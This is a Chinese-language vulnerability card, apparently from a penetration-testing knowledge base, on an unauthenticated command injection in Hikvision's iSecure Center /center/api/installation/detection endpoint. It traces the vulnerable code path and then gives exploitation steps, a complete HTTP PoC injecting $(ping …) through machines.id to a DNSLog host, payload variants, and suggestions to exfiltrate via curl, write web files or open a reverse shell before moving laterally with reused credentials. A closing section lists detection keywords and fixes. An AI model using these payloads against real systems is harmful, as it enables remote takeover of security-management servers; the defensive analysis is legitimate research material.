---
id: web-java-component-hikvision-isecure-installation-detection-rce
title: 海康威视综合安防 /center/api/installation/detection 未授权命令注入：machines.id 经 assembleCheckInstallEnvs/convertExecuteCommand 进入 analysisCmdexeExecuteResult
type: scenario
domain: web
path: web/java/component
technique: hikvision-isecure-installation-detection-rce
tags:
- web
- java
- hikvision
- isecure
- command-injection
- unauth
- rce
- deploy-controller
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V285
  verified_at: '2026-11-08T04:55:31+08:00'
  notes: 已对照原文与7张图核对：DeployController /detection POST+type=environment 分支（图01）、DetectRequestBean type/operate/List<machines>（图02）、MachineInstallationBean id/name/ip/components/tcp/udp（图03）、getSystemDetect 遍历 machines 取 id→assembleCheckInstallEnvs→convertExecuteCommand→analysisCmdexeExecuteResult（图04/05/06）、全局搜索多个调用方（图07）均与卡片一致。卡内已如实注明 PoC 的 machines 为对象而 Bean 为 List 的差异、%20 非空格、原文无执行成功截图，confidence medium 合理；原文未给受影响版本，未设置 versions。dedup 20 个候选全为 new（同产品文件上传卡入口/sink 不同），dup-scan 无本卡 pair。未执行 PoC。
url: /docs/web/java/component/web-java-component-hikvision-isecure-installation-detection-rce/
draft: false
kb_aliases:
- 海康综合安防命令执行
- iSecure Center detection RCE
- /center/api/installation/detection
- DeployController
- getSystemDetect
- assembleCheckInstallEnvs
- convertExecuteCommand
- analysisCmdexeExecuteResult
- machines.id 命令注入
---

## 一句话结论

海康威视综合安防管理平台 `/center/api/installation/detection` 未授权接收 JSON；`type=environment` 时 `DeployController#getDetection` 调用 `IInstallDetectServiceImpl#getSystemDetect`，遍历 `machines` 并把每个 `MachineInstallationBean.id` 作为 `agentNo` 放入 `assembleCheckInstallEnvs` 构造的 JSON（`task.host`），`AgentSendMessageConvert.convertExecuteCommand` 转成系统命令数组后交给 `DataCommonMethod.analysisCmdexeExecuteResult` → `executeCommand(cmdArray)` 执行。`id` 没有任何过滤，可注入 `$(...)`/反引号命令，未认证即可命令执行；文章 PoC 用 `$(ping <dnslog>)` 验证。

## 原理

- **入口与参数**：`DeployController` 上 `@RequestMapping(value={"/detection"}, method={RequestMethod.POST})` 的 `getDetection(@RequestBody DetectRequestBean)` 接收 JSON；`DetectRequestBean` 含 `type`、`operate`、`List<MachineInstallationBean> machines`。当 `type` 等于 `"environment"` 时调用 `installDetectService.getSystemDetect(detectionRequest, operate)`。
- **处理链**：`getSystemDetect` 遍历 `machines`，取 `machineInstallation.getId()` 赋给 `agentNo`；`AgentOperationUtil.assembleCheckInstallEnvs(agentNo)` 把 `agentNo` 放进任务 JSON 的 `task.put("host", agentNo)`（taskName=`environmentDetect`，timeout=1000，param 为空）；随后 `AgentSendMessageConvert.convertExecuteCommand(checkEnvsMessage)` 处理该 JSON（去除换行、转义双引号，并按操作系统转换成对应命令格式），最后 `DataCommonMethod.analysisCmdexeExecuteResult(cmdArray)` 调用 `executeCommand(cmdArray)` 启动进程并读取输出。
- **注入点**：`machines.id` 原样进入 `host` 字段，再被拼进系统命令字符串。平台在 Windows 上通常交给 `cmd /c`、Linux 上交给 `sh -c` 一类 shell 执行，`host` 中的 `$(command)`（Unix）或反引号会被 shell 命令替换；Windows 下对应 `%var%`/`&`/`|` 等元字符也可尝试。转换函数只做换行去除和双引号转义，不校验 `id` 是否为合法主机名/UUID/数字，因此命令注入成立。
- **未授权**：文章称该接口无需身份验证，远程攻击者可直接 POST；`type=environment` 分支直接进入检测流程。
- **其他受影响点**：全局搜索 `DataCommonMethod.analysisCmdexeExecuteResult` 可看到多个调用方（`DataManagerServiceInstanceServiceImpl`、`AgentEnvironmentCallImpl`、`DataManagerUploadPackageServiceImpl`、`IInstallDetectServiceImpl`、`ComponentInstallServiceImpl`、`ResourceInstallServiceImpl`、`ServiceExpansionServiceImpl` 等），说明把外部参数拼进该执行函数的其他接口也可能命令执行，需一并审计。
- **边界**：需要目标版本包含该接口与 `analysisCmdexeExecuteResult` 执行链；若部署了 WAF/网关拦截 `$(`、反引号或 `ping` 等特征，需换编码/命令变体；命令执行权限取决于平台服务账号（通常为高权限服务用户）。

## 触发条件

- 目标为海康威视综合安防管理平台（iSecure Center）存在 `/center/api/installation/detection` 接口的版本。
- 接口未授权即可访问，或已获得低权限会话。
- 请求体为 JSON，`type` 为 `environment`，`machines` 中包含 `id`（结构按目标版本为准）。
- 命令输出可通过 DNSLog/HTTP 外带或响应回显观察；出网受限时可使用时间盲注/写文件等替代验证。

## 利用步骤

1. 确认接口：向 `/center/api/installation/detection` 发送 POST JSON，`type=environment`，`machines` 中带合法结构；观察是否进入检测流程/返回业务错误而非 404/鉴权失败。
2. 用 DNSLog 验证命令替换：`machines.id` 填 `$(ping <随机子域>.dnslog.example)`（或反引号形式），查看 DNS 记录是否收到请求。
3. 替换为实际命令：`id`、`whoami`、`uname -a`、`curl` 外带等；根据回显/外带确认执行账号与权限。
4. 若直接回显不可用，使用时间盲注（`$(sleep 5)`）、写文件到 Web 目录、反弹 shell 等方式验证。
5. 审计其他调用 `analysisCmdexeExecuteResult` 的接口，寻找相同参数进入执行函数的入口（文章通过全局搜索定位到多个 ServiceImpl）。
6. 按授权范围清理测试文件/进程，记录请求与响应作为证据。

## PoC

文章 PoC（原样，`%20` 为原文写法）：

```http
POST /center/api/installation/detection HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1249.139 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Content-Length: 148

{"type": "environment", "operate": "", "machines": {"id": "$(ping%20e19eb49e.log.dnslog.store)"}}
```

说明：

- 文章正文的 Bean 定义中 `machines` 为 `List<MachineInstallationBean>`，而 PoC 使用单个对象；实际目标可能接受对象/数组两种形式，按版本调整。
- `%20` 在 JSON 中不是空格，原文如此；若命令未执行，可改用真实空格、`${IFS}`、`$IFS` 或反引号形式，并注意 `convertExecuteCommand` 会去除换行、转义双引号。
- 验证命令替换也可用 `$(id)`、`` `id` ``、`;id`（Windows 用 `& whoami`）等，取决于 shell 与过滤。

## 变体与关联

- [[web-java-component-hikvision-isecure-file-upload-path-traversal-rce]]：同一海康综合安防产品的任意文件上传写 JSP GetShell；本卡是未授权命令注入，入口与 sink 不同。
- [[web-java-component-hikvision-config-decrypt-service-credential-reuse]]：同产品配置解密与 PostgreSQL/MinIO/ActiveMQ/Redis 凭据复用，可在本卡拿 shell 后进一步横向。
- 变体：其他调用 `analysisCmdexeExecuteResult` 的接口（`AgentEnvironmentCallImpl`、`ComponentInstallServiceImpl`、`ResourceInstallServiceImpl` 等）可能把不同外部参数送入同一命令拼接函数；审计重点是“用户输入 → JSON message → convertExecuteCommand → cmdArray → executeCommand”。
- 变体：Windows 目标可用 `&`、`|`、`%COMSPEC%` 等；Linux 目标用 `$()`/反引号/`;`；无回显时用 DNSLog、HTTP 外带或时间盲注。
- 边界：若目标版本已打补丁、接口增加鉴权、`id` 被白名单校验或 `executeCommand` 改为不经 shell 的参数数组，注入失效。

## 检测与防御

- **检测**：POST `/center/api/installation/detection` 且 JSON 的 `machines.id` 含 `$(`, `` ` ``, `;`, `|`, `&`, `ping`, `nslookup`, `curl`, `wget`, `sleep` 等；DNS/HTTP 外带日志出现异常子域；平台服务进程（Java）异常拉起 `ping`/`sh`/`cmd` 子进程；同一来源短时间内多次请求 detection 接口。
- **防御**：升级官方补丁；为该接口增加鉴权与访问控制；对 `machines.id` 做白名单/格式校验（UUID、数字、合法主机名），拒绝 shell 元字符；`convertExecuteCommand` 不要拼接 shell 字符串，改用参数数组/受控命令模板；`analysisCmdexeExecuteResult` 对每个调用方做输入校验；最小权限运行平台服务；WAF 拦截命令注入特征。
- **响应**：检查 detection 接口访问日志与异常子进程；确认服务账号权限与是否已外带数据；升级补丁并轮换平台/数据库凭据。
